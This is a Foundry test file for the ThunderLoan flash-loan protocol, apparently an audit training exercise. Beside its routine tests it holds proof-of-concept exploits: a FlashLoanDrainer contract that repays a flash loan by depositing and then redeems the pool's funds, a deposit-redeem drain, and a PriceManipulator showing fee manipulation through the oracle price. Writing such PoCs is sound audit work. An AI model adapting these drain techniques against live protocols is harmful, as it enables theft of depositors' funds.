// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver, IThunderLoan, IFlashLoanReceiver} from "../mocks/MockFlashLoanReceiver.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {MockTSwapPool} from "../mocks/MockTSwapPool.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/ERC20Mock.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100; // 1e21
    MockFlashLoanReceiver mockFlashLoanReceiver;
    address user = address(456);

    address liquidityProvider = address(123);
    address liquidityProvider2 = address(123);
    address attacker = makeAddr("attacker");

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public view {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    // Deposit And Redeem Attacker
    function testAttackerCanDepositAndRedeemAfterToDrainProtocolFunds() public setAllowedToken hasDeposits {
        vm.startPrank(attacker);

        tokenA.mint(attacker, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);

        console.log("Attacker Deposited This Amount: ", DEPOSIT_AMOUNT);

        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
        thunderLoan.redeem(tokenA, assetToken.balanceOf(attacker));

        console.log("Attacker Redeemed Right After it and Received: ", tokenA.balanceOf(attacker));

        vm.stopPrank();

        assert(tokenA.balanceOf(attacker) > DEPOSIT_AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT); // 1e21
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getbalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    // FlashLoan Drain

    function testAttackerCanDrainFundsOfTheProtocolByTakingFlashLoanAndDepositingToProtocol() external setAllowedToken hasDeposits {
        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
        FlashLoanDrainer flashLoanDrainer = new FlashLoanDrainer(thunderLoan, assetToken);
        uint256 feeToPay = thunderLoan.getCalculatedFee(tokenA, DEPOSIT_AMOUNT);
        tokenA.mint(address(flashLoanDrainer), feeToPay);

        console.log("Attacker Contract inital Balance Should be The Amount that it's Needed to Pay for the Flash Loan Fee, Which is: ", feeToPay);
        console.log("Attacker Contract Balance Before Taking the Flash Loan With Token A: ", tokenA.balanceOf(address(flashLoanDrainer)));
        console.log("ThunderLoan Contract Balance Before Attacker Takes the Flash Loan With Token A:", tokenA.balanceOf(address(assetToken)));

        thunderLoan.flashloan(address(flashLoanDrainer), tokenA, DEPOSIT_AMOUNT, "");
        flashLoanDrainer.drainThunderLoan(address(tokenA));

        console.log("Attacker Contract Balance of Token A After Draining ThunderLoan Contract:", tokenA.balanceOf(address(flashLoanDrainer)));
        console.log("ThunderLoan Contract Balance After Getting Drained:", tokenA.balanceOf(address(assetToken)));

        assert(tokenA.balanceOf(address(flashLoanDrainer)) > tokenA.balanceOf(address(assetToken)));
    }

    // setAllowedToken on Deposited Asset
    function testSetAllowedTokenOnDepositedAsset() public setAllowedToken hasDeposits {
        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
        console.log("ThunderLoan Contract Token A Balance: " ,tokenA.balanceOf(address(assetToken)));

        vm.startPrank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, false);
        vm.stopPrank();

        vm.startPrank(liquidityProvider);
        uint256 liquidityProviderAssetTokenbalance = assetToken.balanceOf(liquidityProvider);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, tokenA));
        thunderLoan.redeem(tokenA, liquidityProviderAssetTokenbalance);
        vm.stopPrank();
    }


    function testPriceOfFeeCalculationInFlashLoanCanBeManipulated() public setAllowedToken hasDeposits {
        // MockTSwapPool Returns 1e18 WETH for Each Token A
        // If Attacker Sends Large Amounts Of Token A to that Pool, The Price of Token A Will Deflate and Attacker Will Take The Second Flash Loan Much Cheaper
        PriceManipulator priceManipulator = new PriceManipulator(thunderLoan, tokenA);
        tokenA.mint(address(priceManipulator), 2e18);
        uint256 firstFlashLoanFee = thunderLoan.getCalculatedFee(tokenA, 1e10);
        thunderLoan.flashloan(address(priceManipulator), tokenA, 1e10, "");
        // Attacker Sends Huge Amounts of Token A to TSwap Pool Which Causes the Price of Each Token A Deflate to 1e15
        thunderLoan.setPrice(address(tokenA), 1e15);
        uint256 secondFlashLoanFee = thunderLoan.getCalculatedFee(tokenA, 1e10);
        thunderLoan.flashloan(address(priceManipulator), tokenA, 1e10, "");

        console.log("First Flash Loan Fee: ", firstFlashLoanFee);
        console.log("Second Flash Loan Fee: ", secondFlashLoanFee);

        assert(firstFlashLoanFee > secondFlashLoanFee);
    }

    // low fee for non-standard ERC20 Token
    function testCalculatedFeeForNonERC20TokenisMuchLessThanStandardERC20Token() external pure {
        // USDT has 6 decimals so 1 USDT is equal to 1e9
        // WETH has 18 decimals so 1 WETH is equal to 1e18

        // Fee Calculation Formula in ThunderLoan.sol:
        // uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
        // fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;

        // User Takes 100 USDT Flash Loan

        uint256 ValueOfBorrowedUSDTinWeth = ((100 * 1e6) * 1e18) / 1e18 ;
        uint256 USDTfee = (ValueOfBorrowedUSDTinWeth * 1e15) / 1e18;

        // User Takes 100 WETH Flash Loan
        uint256 ValueOfBorrowedWETHinWeth = ((100 * 1e18) * 1e18) / 1e18;
        uint256 WETHfee = (ValueOfBorrowedWETHinWeth * 1e15) / 1e18;

        // assert(USDTfee < WETHfee);

        console.log("Took out 100 USDT, and the Fee For it is: ", USDTfee);
        console.log("Took out 100 WETH, and the Fee For it is: ", WETHfee);
    }

}

contract PriceManipulator {

    ThunderLoan thunderLoan;
    ERC20Mock tokenA;


    bool isFirstFlashLoan = true;
    uint256 public secondFlashLoanFee;

    constructor(ThunderLoan _thunderLoan, ERC20Mock _tokenA) {
        thunderLoan = _thunderLoan;
        tokenA = _tokenA;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        if (isFirstFlashLoan) {
            IERC20(token).approve(address(thunderLoan), amount + fee);
            IThunderLoan(address(thunderLoan)).repay(token, amount + fee);
            isFirstFlashLoan = false;
            return true;
        } else {
            secondFlashLoanFee = fee;
            IERC20(token).approve(address(thunderLoan), amount + fee);
            IThunderLoan(address(thunderLoan)).repay(token, amount + fee);
            return true;
        }
    }

}


contract FlashLoanDrainer {

    ThunderLoan thunderLoan;
    AssetToken assetToken;


    constructor(ThunderLoan _thunderLoan, AssetToken _assetToken) {
        thunderLoan = _thunderLoan;
        assetToken = _assetToken;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function drainThunderLoan(address _token) external {
        uint256 currentExchangeRate = assetToken.getExchangeRate();
        uint256 assetTokenExchangeRatePrecision = assetToken.EXCHANGE_RATE_PRECISION();
        uint256 ThunderLoanTokenABalance = IERC20(_token).balanceOf(address(assetToken));
        uint256 assetTokenAmountToSend = (assetTokenExchangeRatePrecision * ThunderLoanTokenABalance) / currentExchangeRate;
        thunderLoan.redeem(IERC20(_token), assetTokenAmountToSend);
    }

}